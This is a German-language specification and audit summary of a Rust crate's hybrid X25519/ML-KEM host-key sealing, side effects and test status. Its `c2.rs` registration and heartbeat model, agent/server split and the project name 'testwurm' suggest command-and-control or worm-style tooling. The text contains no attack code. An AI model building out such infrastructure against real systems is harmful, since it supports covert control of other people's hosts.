- `ServerPublicKey::decode` verlangt einen X25519-Serverkey mit genau 32 Byte; im Hybrid-Modus muss `mlkem` vorhanden sein und genau `MLKEM_PUB_LEN` (1184) Byte lang sein [hostkey.rs:ServerPublicKey::decode]
- `ServerKeyBundle::public` verlangt ein X25519-Secret mit genau 32 Byte und im Hybrid-Modus ein vorhandenes, gueltiges FIPS-203-kodiertes ML-KEM-Secret [hostkey.rs:ServerKeyBundle::public] [hostkey.rs:mlkem_secret_from_bytes]
- `ServerKeyPair::unseal_master_key` verlangt im hybriden Modus `sealed.len() == SEALED_MASTER_LEN` (1120 = `X25519_PUB_LEN` 32 + `MLKEM_CT_LEN` 1088), im X25519-only-Modus `SEALED_MASTER_X25519_LEN` (32) [hostkey.rs:ServerKeyPair::unseal_master_key]
- Die Ableitungsreihenfolge in `unseal_master_key` ist X25519, dann ML-KEM, dann HKDF; eine vertauschte Reihenfolge ergaebe einen anderen, scheinbar gueltigen Master Key, weshalb der Kontextstring Teil des Formats ist [hostkey.rs:ServerKeyPair::unseal_master_key]
- `derive_master_key` und `derive_master_key_with_context` liefern echtes HKDF-Material; das Ergebnis wird direkt in den Master-Key geschrieben [hostkey.rs:derive_master_key] [hostkey.rs:derive_master_key_with_context]
- Der Seal/Unseal-Roundtrip ist in beiden Modi schliessbar: X25519-only ueber 32 Byte, hybrid ueber 1120 Byte `sealed_master` [hostkey.rs:encapsulate_host_master_key] [hostkey.rs:ServerKeyPair::unseal_master_key]
- Das private ML-KEM-Material wird beim Drop genullt: `ml-kem` traegt mit dem Feature `zeroize` ein `ZeroizeOnDrop` auf dem Dekapsulationsschluessel [hostkey.rs:MlKemSecret]
- **Bekannter Makel:** `HostKeyEncapsulation.ephemeral_x25519_secret` enthaelt laut Feld-Dokumentation das ephemere X25519-Secret, wird aber mit dem DH-Shared-Secret (`*x_shared.as_bytes()`) gefuellt; kein `Drop`/`zeroize` existiert fuer dieses Feld [hostkey.rs:HostKeyEncapsulation]
- `MlRng::try_fill_bytes` liefert immer `Ok(())` und ruft `fill_bytes` auf dem inneren RNG auf, ein Fehler des gewrappten RNG wird also verschluckt [hostkey.rs:MlRng]
- `ARGON2_SALT_LEN` (16) wird nirgends geprueft — `argon2id` validiert die Salt-Laenge nicht [hostkey.rs:ARGON2_SALT_LEN] [hostkey.rs:argon2id]

## Side Effects

- `util::now_rfc3339` und `util::now_unix` lesen die Systemuhr ueber `std::time::SystemTime::now()` [util.rs:now_rfc3339] [util.rs:now_unix]
- `util::jitter` schreibt den neuen xorshift64*-Zustand in den vom Aufrufer gelieferten `&mut u64`-Seed zurueck [util.rs:jitter]
- `util::Sha256Stream::update` mutiert den ueber `&mut self` fortgeschriebenen Hashzustand [util.rs:update]
- `format::FooterFlags::insert` und `format::FooterFlags::remove` mutieren den Flag-Wert des Aufrufers in place [format.rs:FooterFlags::insert] [format.rs:FooterFlags::remove]
- `format::aad_for` leert den uebergebenen `&mut Vec<u8>` und befuellt ihn mit den AAD-Bytes [format.rs:aad_for]
- Im kompilierten Crate gibt es keinen Dateisystem-, Netzwerk- oder Prozesszugriff: kein Aufruf von `std::fs`, `std::net` oder `std::process` [lib.rs:error] [lib.rs:format] [lib.rs:util]
- `c2.rs` ist reines Datenmodell: der Import von `serde::{Deserialize, Serialize}` erzeugt Serialize/Deserialize-Ableitungen auf allen sechs Wire-Typen; die (De-)Serialisierung allokiert je Feld einen `String` [c2.rs:Host] [c2.rs:RegisterRequest]
- `c2.rs` fuehrt selbst keine HTTP-Anfrage aus — die Pfadkonstanten sind nur Daten; der Transport liegt in `kx-agent` und `kx-server` [c2.rs:PATH_REGISTER] [c2.rs:PATH_HEARTBEAT]
- Ausschliesslich in `hostkey.rs` und damit derzeit ohne Wirkung: `ServerKeyBundle::generate` erzeugt das X25519-Secret und im Hybrid-Modus ein ML-KEM-768-Schluesselpaar [hostkey.rs:ServerKeyBundle::generate]
- Ausschliesslich in `hostkey.rs` und damit derzeit ohne Wirkung: `encapsulate_host_master_key` erzeugt das ephemere X25519-Secret und im Hybrid-Modus das ML-KEM-Chiffretext [hostkey.rs:encapsulate_host_master_key]
- Ausschliesslich in `hostkey.rs` und damit derzeit ohne Wirkung: `MlKemSecret::drop` ueberschreibt die ML-KEM-Secretbytes mit Nullen [hostkey.rs:Drop for MlKemSecret]
- Ausschliesslich in `hostkey.rs` und damit derzeit ohne Wirkung: `argon2id` allokiert pro Aufruf rund 64 MiB (`m = 65_536` KiB, `t = 3`, `p = 4`) [hostkey.rs:argon2id] [hostkey.rs:ARGON2_M_KIB]
- Ausschliesslich in `hostkey.rs` und damit derzeit ohne Wirkung: `ServerKeyBundle::public` und `ServerKeyPair::from_bundle` kopieren die X25519-Secretbytes in ein lokales Stack-Array, das nicht genullt wird [hostkey.rs:ServerKeyBundle::public] [hostkey.rs:ServerKeyPair::from_bundle]

## Verification

- Run: `cargo test` (ausgefuehrt in `/Volumes/T7/Projekte/testwurm/kx`)
- Stand: `cargo test --workspace` ist gruen — **59 Tests, 0 Fehler**; davon `cargo test -p kx-core`: **31 Tests, 0 Fehler** (11 in `c2.rs`, 10 in `format.rs`, 7 in `util.rs`, 2 in `error.rs`, 1 in `lib.rs`)
- Die Testmodule liegen in `c2.rs` [c2.rs:tests], `error.rs` [error.rs:tests], `util.rs` [util.rs:tests] und `format.rs` [format.rs:tests]; `hostkey.rs` fuehrt mangels Kompilierung keine Tests aus
- `c2.rs` traegt 10 Vertragstests: Key-Set-Pinning, Strictness-Nachweis (Antworttypen lehnen unbekannte Felder ab, Request-Typen tolerieren sie), Roundtrips ueber Golden-JSON und die Stabilitaet der Endpunktpfade [c2.rs:tests::response_key_sets_are_pinned] [c2.rs:tests::response_types_reject_unknown_fields] [c2.rs:tests::request_types_tolerate_unknown_fields] [c2.rs:tests::endpoint_paths_are_stable]
